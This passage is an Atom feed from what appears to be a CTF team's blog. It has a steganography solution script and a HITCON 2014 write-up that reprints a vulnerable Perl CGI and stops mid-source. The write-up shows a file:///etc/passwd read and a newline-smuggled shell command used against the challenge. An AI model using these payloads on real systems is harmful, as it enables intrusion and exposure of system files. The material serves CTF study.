<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[h3x5p34k CTF Team]]></title>
  <link href="http://h3x5p34k.github.io/atom.xml" rel="self"/>
  <link href="http://h3x5p34k.github.io/"/>
  <updated>2014-08-31T14:31:00+04:30</updated>
  <id>http://h3x5p34k.github.io/</id>
  <author>
    <name><![CDATA[h3x5p34k]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Steganography Unknown CTF]]></title>
    <link href="http://h3x5p34k.github.io/blog/2014/08/31/steganography-unknown-ctf/"/>
    <updated>2014-08-31T14:03:35+04:30</updated>
    <id>http://h3x5p34k.github.io/blog/2014/08/31/steganography-unknown-ctf</id>
    <content type="html"><![CDATA[<p> Hi guys ,
 This post is about Steganography challange of hicking sites , because challange is live now i changed its name to unknown ctf</p>

<p> <img src="http://up.ashiyane.org/images/jvsrdh8l9xlbd53n8q.png" title="steg unknown" alt="alt text" />
 <!--more--></p>

<p> in picure you can and understand that , you have to read red pixels , but how :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">Image</span>
</span><span class='line'><span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s">&#39;stego9.png&#39;</span><span class="p">)</span>
</span><span class='line'><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">w</span><span class="p">)</span> <span class="o">=</span> <span class="n">im</span><span class="o">.</span><span class="n">size</span>
</span><span class='line'><span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s">&quot;RGB&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">h</span><span class="p">,</span><span class="n">w</span><span class="p">),</span> <span class="s">&quot;white&quot;</span><span class="p">)</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">h</span><span class="p">):</span>
</span><span class='line'> <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">w</span><span class="p">):</span>
</span><span class='line'>  <span class="n">rgb_im</span> <span class="o">=</span> <span class="n">im</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s">&#39;RGB&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">r</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">rgb_im</span><span class="o">.</span><span class="n">getpixel</span><span class="p">((</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">))</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="n">g</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="mi">255</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="p">:</span>
</span><span class='line'>   <span class="n">data</span> <span class="o">=</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span>
</span><span class='line'>   <span class="n">img</span><span class="o">.</span><span class="n">putpixel</span><span class="p">((</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">),(</span><span class="mi">255</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span>
</span><span class='line'><span class="n">img</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s">&quot;flag.png&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Flag.png :</p>

<p><img src="http://up.ashiyane.org/images/3050pypz0lmybvnibfj.png" title="steg unknown" alt="alt text" /></p>

<p>you can see &ldquo;PASSWORD&rdquo; but cant read password ..
using Stegsolve &ndash;> Image Combiner &ndash;> Vertcial Mode
Solved.png :</p>

<p><img src="http://up.ashiyane.org/images/ri56hkcwih8biry5ams.png" title="steg unknown" alt="alt text" /></p>

<p>The flag is :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="mi">2</span><span class="c1">#4%68x!</span>
</span></code></pre></td></tr></table></div></figure>


<p>Good Luck</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HITCON 2014 Diagcgi Writeup]]></title>
    <link href="http://h3x5p34k.github.io/blog/2014/08/27/hitcon-2014-diagcgi-writeup/"/>
    <updated>2014-08-27T22:40:17+04:30</updated>
    <id>http://h3x5p34k.github.io/blog/2014/08/27/hitcon-2014-diagcgi-writeup</id>
    <content type="html"><![CDATA[<p>diagcgi was web challange based on perl language and cgi web programming
i scanned the target with Acunetix and scanner found that local file inclusion(somehow but not exactly) which we colud read /etc/passwd file with it with this command in curl</p>

<!--more-->


<p>file:///etc/passwd .
reading this file found a clue key:x:1001:1001::/home/key: , with this tried to read /home/key or list its files if it was directory but nothing achived.
also we could excute command by curl for example %0alocate%20key%0a and it gave us lot of information 1. ~/key.txt 2. read_key but we coludnt run or read them<br/>
after it tried to read source of cgi script</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/perl -w</span>
</span><span class='line'>
</span><span class='line'><span class="k">use</span> <span class="n">CGI</span><span class="p">;</span>
</span><span class='line'><span class="k">use</span> <span class="nn">Digest::</span><span class="n">MD5</span> <span class="sx">qw(md5_hex)</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$cgi</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CGI</span><span class="p">;</span>
</span><span class='line'><span class="nv">$SESSDIR</span> <span class="o">=</span> <span class="s">&quot;/tmp/&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$sessfile</span> <span class="o">=</span> <span class="nv">$cgi</span><span class="o">-&gt;</span><span class="n">cookie</span><span class="p">(</span><span class="s">&quot;diagsess&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$arg0</span> <span class="o">=</span> <span class="nv">$cgi</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&quot;arg&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$action</span> <span class="o">=</span> <span class="nv">$cgi</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&quot;action&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$arg</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">safestr</span><span class="p">(</span><span class="nv">$arg0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">defined</span><span class="p">(</span><span class="nv">$sessfile</span><span class="p">)</span> <span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="n">md5_hex</span><span class="p">(</span><span class="nv">$cgi</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&quot;sechash&quot;</span><span class="p">))</span> <span class="o">=~</span><span class="sr"> /^000000000000.*$/</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="nv">$sesshash</span><span class="p">{</span><span class="s">&#39;user&#39;</span><span class="p">}</span> <span class="o">=</span> <span class="s">&#39;admin&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="nv">$sesshash</span><span class="p">{</span><span class="s">&#39;user&#39;</span><span class="p">}</span>  <span class="o">=</span> <span class="s">&#39;guest&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$sesshash</span><span class="p">{</span><span class="s">&#39;ip&#39;</span><span class="p">}</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">get_ip</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$diagsess</span> <span class="o">=</span> <span class="n">md5_hex</span><span class="p">(</span> <span class="nv">$sesshash</span><span class="p">{</span><span class="s">&#39;user&#39;</span><span class="p">}</span> <span class="o">.</span> <span class="s">&#39;|||&#39;</span> <span class="o">.</span> <span class="nv">$sesshash</span><span class="p">{</span><span class="s">&#39;ip&#39;</span><span class="p">}</span> <span class="p">);</span>
</span><span class='line'>    <span class="nv">$cookie</span> <span class="o">=</span> <span class="s">&quot;diagsess=$diagsess;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="n">write_session</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="nv">$cgi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">(</span><span class="o">-</span><span class="n">cookie</span> <span class="o">=&gt;</span> <span class="nv">$cookie</span><span class="p">,</span>
</span><span class='line'>            <span class="o">-</span><span class="n">expires</span> <span class="o">=&gt;</span> <span class="s">&#39;Mon, 01 Jan 1999 00:00:00 GMT&#39;</span><span class="p">,</span>
</span><span class='line'>            <span class="o">-</span><span class="s">&#39;cache-control&#39;</span> <span class="o">=&gt;</span> <span class="s">&#39;no-cache&#39;</span><span class="p">,</span>
</span><span class='line'>            <span class="o">-</span><span class="n">pragma</span> <span class="o">=&gt;</span> <span class="s">&#39;no-cache&#39;</span><span class="p">,</span><span class="o">-</span><span class="s">&#39;location&#39;</span><span class="o">=&gt;</span> <span class="s">&#39;dana-na.cgi?sechash=&#39;</span> <span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">exit</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">else</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="nv">$cgi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">();</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="n">read_session</span><span class="p">;</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="n">print_menu</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">defined</span> <span class="p">(</span><span class="nv">$action</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">length</span><span class="p">(</span><span class="nv">$action</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">=~</span><span class="sr"> /^print_session$/</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="o">&amp;</span><span class="n">print_session</span><span class="p">;</span>
</span><span class='line'>        <span class="nb">exit</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">=~</span><span class="sr"> /^curl$/</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="o">&amp;</span><span class="n">curl</span><span class="p">(</span><span class="nv">$arg</span><span class="p">);</span>
</span><span class='line'>        <span class="nb">exit</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">=~</span><span class="sr"> /^ping$/</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="o">&amp;</span><span class="n">ping</span><span class="p">(</span><span class="nv">$arg</span><span class="p">);</span>
</span><span class='line'>        <span class="nb">exit</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">=~</span><span class="sr"> /^traceroute$/</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="o">&amp;</span><span class="n">traceroute</span> <span class="p">(</span><span class="nv">$arg</span><span class="p">);</span>
</span><span class='line'>        <span class="nb">exit</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">=~</span><span class="sr"> /^shell$/</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="o">&amp;</span><span class="n">shell</span><span class="p">(</span><span class="nv">$arg</span><span class="p">);</span>
</span><span class='line'>        <span class="nb">exit</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">curl</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="nv">$host</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;&lt;pre&gt;&lt;textarea rows=24 cols=80&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">length</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="nb">open</span><span class="p">(</span><span class="n">GG</span><span class="p">,</span><span class="s">&quot;/usr/bin/curl -s $host |&quot;</span><span class="p">)</span> <span class="ow">and</span> <span class="k">do</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="k">while</span><span class="p">(</span><span class="sr">&lt;GG&gt;</span><span class="p">)</span>
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">print</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">ping</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">my</span> <span class="nv">$host</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">length</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="nb">open</span><span class="p">(</span><span class="n">GG</span><span class="p">,</span><span class="s">&quot;/bin/ping -c3 $host |&quot;</span><span class="p">)</span> <span class="ow">and</span> <span class="k">do</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="k">while</span><span class="p">(</span><span class="sr">&lt;GG&gt;</span><span class="p">)</span>
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">print</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="p">};</span>
</span><span class='line'>        <span class="nb">close</span> <span class="n">GG</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">traceroute</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">my</span> <span class="nv">$host</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">length</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="nb">open</span><span class="p">(</span><span class="n">GG</span><span class="p">,</span><span class="s">&quot;/usr/sbin/traceroute -d -n -w 5 $host |&quot;</span><span class="p">)</span> <span class="ow">and</span> <span class="k">do</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="k">while</span><span class="p">(</span><span class="sr">&lt;GG&gt;</span><span class="p">)</span>
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">print</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="p">};</span>
</span><span class='line'>        <span class="nb">close</span> <span class="n">GG</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">read_session</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="nb">undef</span> <span class="nv">%sesshash</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="o">-</span><span class="n">f</span> <span class="s">&quot;$SESSDIR/$sessfile&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;session error!&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nb">open</span><span class="p">(</span><span class="n">GG</span><span class="p">,</span> <span class="s">&quot;$SESSDIR/$sessfile&quot;</span><span class="p">)</span> <span class="ow">and</span> <span class="k">do</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">while</span> <span class="p">(</span><span class="sr">&lt;GG&gt;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="nb">eval</span><span class="p">(</span><span class="nv">$_</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="nb">close</span> <span class="n">GG</span><span class="p">;</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">write_session</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="nb">open</span><span class="p">(</span><span class="n">GG</span><span class="p">,</span> <span class="s">&quot;&gt;$SESSDIR/$diagsess&quot;</span><span class="p">)</span> <span class="ow">and</span> <span class="k">do</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">foreach</span> <span class="p">(</span><span class="nb">sort</span> <span class="nb">keys</span> <span class="nv">%sesshash</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="k">print</span> <span class="n">GG</span> <span class="s">&quot;\$sesshash{&#39;$_&#39;} = &#39;$sesshash{$_}&#39;;\n&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'>    <span class="nb">close</span> <span class="n">GG</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">print_session</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">foreach</span> <span class="p">(</span><span class="nb">sort</span> <span class="nb">keys</span> <span class="nv">%sesshash</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;$_=$sesshash{$_}\n&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">shell</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span>  <span class="nv">$sesshash</span><span class="p">{</span><span class="s">&#39;user&#39;</span><span class="p">}</span> <span class="ow">eq</span> <span class="s">&#39;admin&#39;</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="nb">open</span><span class="p">(</span><span class="n">GG</span><span class="p">,</span> <span class="s">&quot;$cmd |&quot;</span><span class="p">)</span> <span class="ow">and</span> <span class="k">do</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="k">print</span><span class="p">;</span>
</span><span class='line'>        <span class="p">};</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;sorry $sesshash{&#39;user&#39;}! you&#39;re not admin!\n&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">print_menu</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="nv">$arg0</span> <span class="o">=~</span> <span class="sr">s/\&lt;/\&lt;\;/g</span><span class="p">;</span>
</span><span class='line'>    <span class="nb">open</span><span class="p">(</span><span class="n">GG</span><span class="p">,</span><span class="s">&quot;cat menu.html |&quot;</span><span class="p">)</span> <span class="ow">and</span> <span class="k">do</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">while</span><span class="p">(</span><span class="sr">&lt;GG&gt;</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="nv">$_</span> <span class="o">=~</span> <span class="sr">s/\%\%arg\%\%/$arg0/g</span><span class="p">;</span>
</span><span class='line'>            <span class="k">print</span> <span class="nv">$_</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="nb">close</span> <span class="n">GG</span><span class="p">;</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">get_ip</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="nv">$h1</span> <span class="o">=</span> <span class="nv">$ENV</span><span class="p">{</span><span class="s">&#39;REMOTE_ADDR&#39;</span><span class="p">};</span>
</span><span class='line'>    <span class="nv">$h2</span> <span class="o">=</span> <span class="nv">$ENV</span><span class="p">{</span><span class="s">&#39;HTTP_CLIENT_IP&#39;</span><span class="p">};</span>
